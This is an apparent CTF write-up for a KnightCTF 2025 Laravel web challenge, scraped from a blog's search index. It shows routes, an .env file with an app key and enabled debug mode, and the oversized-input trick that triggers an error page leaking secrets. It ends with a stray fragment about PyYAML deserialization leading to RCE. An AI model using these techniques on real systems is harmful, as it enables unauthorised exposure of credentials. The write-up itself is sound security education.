The first thing I did was read the web.php file located in the routes folder. I found the following routes: Route::get('/calculator', [CalculatorController::class, 'index']); Route::post('/calculator', [CalculatorController::class, 'calculate']); // Handle form submission Route::get('/convert', [UnitConversionController::class, 'index']); Route::post('/convert', [UnitConversionController::class, 'convert']); Route::get('/character-count', [StringManipulationController::class, 'characterCountIndex']); Route::post('/character-count', [StringManipulationController::class, 'characterCount']); Route::get('/reverse-string', [StringManipulationController::class, 'reverseStringIndex']); Route::post('/reverse-string', [StringManipulationController::class, 'reverseString']); Route::post('/profile', [ProfileController::class, 'index']); Route::get('/profile/error', [ProfileController::class, 'triggerError']); // Error-triggering route Route::get('/', function () { return view('welcome'); Next, I read the .env file and found something interesting: APP_NAME=Laravel APP_ENV=local APP_KEY=base64:KnrD53eO60BJBvCVGNlBuOqktUCAsTuod34OelLJjPQ= APP_DEBUG=true APP_URL=http://localhost MAX_CALC_LIMIT=100000000000000000 LOG_CHANNEL=stack LOG_DEPRECATIONS_CHANNEL=null LOG_LEVEL=debug DB_CONNECTION=mysql DB_HOST=127.0.0.1 DB_PORT=3306 DB_DATABASE=laravel DB_USERNAME=root DB_PASSWORD= BROADCAST_DRIVER=log CACHE_DRIVER=file FILESYSTEM_DISK=local QUEUE_CONNECTION=sync SESSION_DRIVER=file SESSION_LIFETIME=120 FLAG=KCTF{i_am_not_flag} Aside from the APP_KEY and FLAG, as we can see, Laravel’s debug mode is enabled. When debug mode is enabled in Laravel, any error that occurs will trigger a detailed error page. This page includes: Error Message: A clear description of the error. Stack Trace: A full trace of the error, showing the file paths and lines of code where the issue occurred. Environment Details: Information about the environment, including variables, configurations, and request headers. Sensitive Data Exposure: Potential exposure of .env values, database credentials, API keys, and other sensitive information. So, I thought about exploiting the enabled debug mode in Laravel to capture the flag. The only thing I needed was a way to trigger any kind of error. I found this method in the /calculator route, to be more precise, in the CalculatorController.php file under the Http/Controllers folder. As we can see, by entering a number greater than MAX_CALC_LIMIT=100000000000000000 an exception is thrown: \u003c?php namespace App\\Http\\Controllers; use Illuminate\\Http\\Request; class CalculatorController extends Controller { public function index() { return view('calculator'); } public function calculate(Request $request) { $request-\u003evalidate([ 'num1' =\u003e 'required|numeric', 'num2' =\u003e 'required|numeric', 'operation' =\u003e 'required|in:add,sub,mul,div', ]); $num1 = $request-\u003einput('num1'); $num2 = $request-\u003einput('num2'); $operation = $request-\u003einput('operation'); $limit = env('MAX_CALC_LIMIT', 100000); if ($num1 \u003e $limit || $num2 \u003e $limit) { throw new \\Exception(\"You have hit the calculation limit set in the .env file.\"); } $result = match ($operation) { 'add' =\u003e $num1 + $num2, 'sub' =\u003e $num1 - $num2, 'mul' =\u003e $num1 * $num2, 'div' =\u003e $num2 != 0 ? $num1 / $num2 : throw new \\Exception(\"Division by zero is not allowed.\"), }; return view('calculator', ['result' =\u003e $result]); } } ","date":"02/04/2025","objectID":"/posts/2025/02/04/exceeding-knight/:0:2","tags":["Web Security","Improper Error Handling","Laravel"],"title":"Exceeding Knight","uri":"/posts/2025/02/04/exceeding-knight/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Exploit So, all I had to do was enter 1000000000000000000 (just adding a simple zero) in the num1 parameter to trigger the exception.

So, the decoded base64 seems to be reflected on the page, as we can see from the previous screenshot. It seems that since it mentions YAML, this could be a case of YAML insecure deserialization. In fact, looking at the request header, we can tell that everything is being executed with Python. Since Python has a library called PyYAML, we can exploit the deserialization process to achieve Remote Code Execution (RCE).
